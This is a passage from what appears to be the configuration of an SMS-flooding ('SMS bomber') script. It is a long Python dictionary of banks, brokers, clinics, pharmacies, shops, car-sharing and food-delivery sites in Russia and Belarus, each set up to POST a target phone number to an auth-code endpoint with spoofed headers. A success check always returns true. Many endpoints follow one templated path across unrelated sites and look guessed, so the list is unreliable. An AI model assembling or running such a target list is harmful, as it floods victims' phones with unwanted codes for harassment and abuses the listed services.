        "headers": lambda: get_common_headers("https://rencredit.ru/", "https://rencredit.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api273": {
        "name": "TinkoffInvest",
        "url": "https://www.tinkoff.ru/invest/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.tinkoff.ru/", "https://www.tinkoff.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api274": {
        "name": "SberInvest",
        "url": "https://sberinvest.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sberinvest.ru/", "https://sberinvest.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api275": {
        "name": "VTBInvest",
        "url": "https://vtb-invest.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vtb-invest.ru/", "https://vtb-invest.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api276": {
        "name": "AlfaInvest",
        "url": "https://alfabank.ru/invest/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://alfabank.ru/", "https://alfabank.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api277": {
        "name": "BCБ",
        "url": "https://bcs.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bcs.ru/", "https://bcs.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api278": {
        "name": "Finam",
        "url": "https://www.finam.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.finam.ru/", "https://www.finam.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api279": {
        "name": "FreedomFinance",
        "url": "https://ffin.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ffin.ru/", "https://ffin.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api280": {
        "name": "OpenBroker",
        "url": "https://open-broker.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://open-broker.ru/", "https://open-broker.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api281": {
        "name": "KitFinance",
        "url": "https://brokerkf.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://brokerkf.ru/", "https://brokerkf.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api282": {
        "name": "SolidBroker",
        "url": "https://solidbroker.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://solidbroker.ru/", "https://solidbroker.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api283": {
        "name": "AlorBroker",
        "url": "https://www.alorbroker.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.alorbroker.ru/", "https://www.alorbroker.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api284": {
        "name": "Aton",
        "url": "https://aton.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://aton.ru/", "https://aton.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api285": {
        "name": "Zerich",
        "url": "https://www.zerich.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.zerich.com/", "https://www.zerich.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api286": {
        "name": "ITInvest",
        "url": "https://www.itinvest.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.itinvest.ru/", "https://www.itinvest.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api287": {
        "name": "BКС-Премьер",
        "url": "https://vcs.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vcs.ru/", "https://vcs.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api288": {
        "name": "SuperJob",
        "url": "https://www.superjob.ru/auth/sms/",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.superjob.ru/", "https://www.superjob.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api289": {
        "name": "HeadHunter",
        "url": "https://hh.ru/applicant/phone/confirm",
        "method": "POST",
        "headers": lambda: get_common_headers("https://hh.ru/", "https://hh.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api290": {
        "name": "RabotaRu",
        "url": "https://www.rabota.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.rabota.ru/", "https://www.rabota.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api291": {
        "name": "HabrFreelance",
        "url": "https://freelance.habr.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://freelance.habr.com/", "https://freelance.habr.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api292": {
        "name": "FlRu",
        "url": "https://www.fl.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.fl.ru/", "https://www.fl.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api293": {
        "name": "Kwork",
        "url": "https://kwork.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kwork.ru/", "https://kwork.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api294": {
        "name": "Weblancer",
        "url": "https://www.weblancer.net/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.weblancer.net/", "https://www.weblancer.net", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api295": {
        "name": "ProfiRu",
        "url": "https://profi.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://profi.ru/", "https://profi.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api296": {
        "name": "YandexServices",
        "url": "https://uslugi.yandex.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://uslugi.yandex.ru/", "https://uslugi.yandex.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api297": {
        "name": "Blizko",
        "url": "https://www.blizko.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.blizko.ru/", "https://www.blizko.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api298": {
        "name": "TiuRu",
        "url": "https://tiu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tiu.ru/", "https://tiu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api299": {
        "name": "PultRu",
        "url": "https://www.pult.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.pult.ru/", "https://www.pult.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api300": {
        "name": "DoctorRu",
        "url": "https://www.doctu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.doctu.ru/", "https://www.doctu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api301": {
        "name": "Medsi",
        "url": "https://medsi.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://medsi.ru/", "https://medsi.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api302": {
        "name": "Invitro",
        "url": "https://www.invitro.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.invitro.ru/", "https://www.invitro.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api303": {
        "name": "Helix",
        "url": "https://helix.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://helix.ru/", "https://helix.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api304": {
        "name": "KDL",
        "url": "https://kdl.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kdl.ru/", "https://kdl.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api305": {
        "name": "Hemotest",
        "url": "https://gemotest.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gemotest.ru/", "https://gemotest.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api306": {
        "name": "SberHealth",
        "url": "https://sberhealth.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sberhealth.ru/", "https://sberhealth.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api307": {
        "name": "DocDoc",
        "url": "https://www.docdoc.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.docdoc.ru/", "https://www.docdoc.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api308": {
        "name": "NaPopravku",
        "url": "https://napopravku.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://napopravku.ru/", "https://napopravku.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api309": {
        "name": "ProDoctorov",
        "url": "https://prodoctorov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://prodoctorov.ru/", "https://prodoctorov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api310": {
        "name": "Eapteka",
        "url": "https://eapteka.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://eapteka.ru/", "https://eapteka.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api311": {
        "name": "ZdravCity",
        "url": "https://zdravcity.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://zdravcity.ru/", "https://zdravcity.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api312": {
        "name": "Rigla",
        "url": "https://rigla.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rigla.ru/", "https://rigla.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api313": {
        "name": "ASNA",
        "url": "https://asna.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://asna.ru/", "https://asna.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api314": {
        "name": "PlanetZdorovya",
        "url": "https://planetazdorovya.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://planetazdorovya.ru/", "https://planetazdorovya.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api315": {
        "name": "Oзерки",
        "url": "https://03.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://03.ru/", "https://03.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api316": {
        "name": "AptekaRu",
        "url": "https://apteka.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://apteka.ru/", "https://apteka.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api317": {
        "name": "Vita",
        "url": "https://vita.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vita.ru/", "https://vita.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api318": {
        "name": "Maxikepeer",
        "url": "https://maxikepeer.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://maxikepeer.ru/", "https://maxikepeer.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api319": {
        "name": "stolichki",
        "url": "https://stolichki.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://stolichki.ru/", "https://stolichki.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api320": {
        "name": "Bристоль",
        "url": "https://bristol.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bristol.ru/", "https://bristol.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api321": {
        "name": "KrasnoeBelye",
        "url": "https://kras-bel.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kras-bel.ru/", "https://kras-bel.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api322": {
        "name": "Dixy",
        "url": "https://dixy.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://dixy.ru/", "https://dixy.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api323": {
        "name": "Billa",
        "url": "https://billa.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://billa.ru/", "https://billa.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api324": {
        "name": "Spar",
        "url": "https://spar.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://spar.ru/", "https://spar.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api325": {
        "name": "Euroopt",
        "url": "https://euroopt.by/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://euroopt.by/", "https://euroopt.by", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api326": {
        "name": "Korona",
        "url": "https://korona.by/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://korona.by/", "https://korona.by", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api327": {
        "name": "Green",
        "url": "https://green-store.by/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://green-store.by/", "https://green-store.by", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api328": {
        "name": "Vitalur",
        "url": "https://vitalur.by/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vitalur.by/", "https://vitalur.by", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api329": {
        "name": "Mile",
        "url": "https://mile.by/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mile.by/", "https://mile.by", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api330": {
        "name": "OMA",
        "url": "https://oma.by/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://oma.by/", "https://oma.by", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api331": {
        "name": "5element",
        "url": "https://5element.by/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://5element.by/", "https://5element.by", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api332": {
        "name": "Electroforce",
        "url": "https://electroforce.by/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://electroforce.by/", "https://electroforce.by", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api333": {
        "name": "Beltelecom",
        "url": "https://beltelecom.by/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://beltelecom.by/", "https://beltelecom.by", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api334": {
        "name": "A1By",
        "url": "https://a1.by/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://a1.by/", "https://a1.by", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api335": {
        "name": "MtsBy",
        "url": "https://mts.by/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mts.by/", "https://mts.by", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api336": {
        "name": "LifeBy",
        "url": "https://life.com.by/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://life.com.by/", "https://life.com.by", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api337": {
        "name": "WildberriesBy",
        "url": "https://wildberries.by/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://wildberries.by/", "https://wildberries.by", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api338": {
        "name": "OzonBy",
        "url": "https://ozon.by/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ozon.by/", "https://ozon.by", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api339": {
        "name": "Kufar",
        "url": "https://kufar.by/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kufar.by/", "https://kufar.by", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api340": {
        "name": "OnlinerBy",
        "url": "https://onliner.by/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://onliner.by/", "https://onliner.by", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api341": {
        "name": "Domovita",
        "url": "https://domovita.by/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://domovita.by/", "https://domovita.by", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api342": {
        "name": "RealtBy",
        "url": "https://realt.by/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://realt.by/", "https://realt.by", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api343": {
        "name": "TutBy",
        "url": "https://tut.by/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tut.by/", "https://tut.by", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api344": {
        "name": "AbwBy",
        "url": "https://abw.by/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://abw.by/", "https://abw.by", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api345": {
        "name": "Autonavigator",
        "url": "https://autonavigator.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://autonavigator.ru/", "https://autonavigator.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api346": {
        "name": "DromRu",
        "url": "https://drom.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://drom.ru/", "https://drom.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api347": {
        "name": "Am.ru",
        "url": "https://am.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://am.ru/", "https://am.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api348": {
        "name": "AutoRu",
        "url": "https://auto.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://auto.ru/", "https://auto.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api349": {
        "name": "YandexDriveRu",
        "url": "https://drive.yandex.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://drive.yandex.ru/", "https://drive.yandex.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api350": {
        "name": "BelkaCarRu",
        "url": "https://belkacar.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://belkacar.ru/", "https://belkacar.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api351": {
        "name": "YouDrive",
        "url": "https://youdrive.today/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://youdrive.today/", "https://youdrive.today", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api352": {
        "name": "Delimobil",
        "url": "https://delimobil.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://delimobil.ru/", "https://delimobil.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api353": {
        "name": "Matreshshki",
        "url": "https://matreshshki.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://matreshshki.ru/", "https://matreshshki.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api354": {
        "name": "CityDrive",
        "url": "https://citydrive.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://citydrive.ru/", "https://citydrive.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api355": {
        "name": "RentME",
        "url": "https://rentme.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rentme.ru/", "https://rentme.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api356": {
        "name": "Whoosh",
        "url": "https://whoosh.bike/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://whoosh.bike/", "https://whoosh.bike", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api357": {
        "name": "Urent",
        "url": "https://urent.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://urent.ru/", "https://urent.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api358": {
        "name": "Headway",
        "url": "https://headway.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://headway.ru/", "https://headway.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api359": {
        "name": "BusyFly",
        "url": "https://busyfly.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://busyfly.ru/", "https://busyfly.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api360": {
        "name": "Eleven",
        "url": "https://eleven.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://eleven.ru/", "https://eleven.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api361": {
        "name": "Lite",
        "url": "https://lite.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://lite.ru/", "https://lite.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api362": {
        "name": "Red",
        "url": "https://red.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://red.ru/", "https://red.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api363": {
        "name": "GreenFlow",
        "url": "https://greenflow.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://greenflow.ru/", "https://greenflow.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api364": {
        "name": "BlueFlow",
        "url": "https://blueflow.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://blueflow.ru/", "https://blueflow.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api365": {
        "name": "Jet",
        "url": "https://jet.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://jet.ru/", "https://jet.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api366": {
        "name": "Scooter",
        "url": "https://scooter.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://scooter.ru/", "https://scooter.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api367": {
        "name": "Koleso",
        "url": "https://koleso.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://koleso.ru/", "https://koleso.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api368": {
        "name": "Samokat",
        "url": "https://samokat.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://samokat.ru/", "https://samokat.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api369": {
        "name": "YandexLavka",
        "url": "https://lavka.yandex.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://lavka.yandex.ru/", "https://lavka.yandex.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api370": {
        "name": "DeliveryClubFood",
        "url": "https://delivery-club.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://delivery-club.ru/", "https://delivery-club.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api371": {
        "name": "Broniboy",
        "url": "https://broniboy.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://broniboy.ru/", "https://broniboy.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api372": {
        "name": "Chibbis",
        "url": "https://chibbis.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://chibbis.ru/", "https://chibbis.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api373": {
        "name": "Tanuki",
        "url": "https://tanuki.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tanuki.ru/", "https://tanuki.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api374": {
        "name": "Yakitoriya",
        "url": "https://yakitoriya.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yakitoriya.ru/", "https://yakitoriya.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api375": {
        "name": "Subway",
        "url": "https://subway.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://subway.ru/", "https://subway.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api376": {
        "name": "McDonalds",
        "url": "https://mcdonalds.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mcdonalds.ru/", "https://mcdonalds.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api377": {
        "name": "VkusVill",
        "url": "https://vkusvill.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vkusvill.ru/", "https://vkusvill.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api378": {
        "name": "AzbukaVkusra",
        "url": "https://av.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://av.ru/", "https://av.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api379": {
        "name": "BillaRu",
        "url": "https://billa.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://billa.ru/", "https://billa.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api380": {
        "name": "Selgros",
        "url": "https://selgros.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://selgros.ru/", "https://selgros.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api381": {
        "name": "MetroCC",
        "url": "https://online.metro-cc.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://online.metro-cc.ru/", "https://online.metro-cc.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api382": {
        "name": "Globus",
        "url": "https://www.globus.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.globus.ru/", "https://www.globus.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api383": {
        "name": "LentaRu",
        "url": "https://lenta.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://lenta.com/", "https://lenta.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api384": {
        "name": "Oкей",
        "url": "https://www.okeydostavka.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.okeydostavka.ru/", "https://www.okeydostavka.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api385": {
        "name": "Victoria",
        "url": "https://victoria-group.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://victoria-group.ru/", "https://victoria-group.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api386": {
        "name": "Semya",
        "url": "https://semya.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://semya.ru/", "https://semya.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api387": {
        "name": "DixyRu",
